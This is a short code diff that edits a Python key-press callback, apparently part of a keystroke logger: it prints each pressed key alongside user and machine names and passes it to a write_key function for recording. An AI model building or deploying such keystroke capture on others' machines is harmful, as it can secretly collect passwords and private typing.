@@ -9,9 +9,14 @@ command = ""
 
 
 def on_press(key):
-    c = str(key).replace("'", "")
-    print("{0} pressed".format(key))
-    print(f"{user}@{pc} $ {c}")
+    print("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% KEYBOARD %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%")
+    # print("{0} pressed".format(key))
+    print(key)
+
+    # c = str(key).replace("'", "")
+    k = "{0}".format(key).replace("'", "")
+
+    print(f"{user}@{pc} $ {k}")
     write_key(key)
 
 
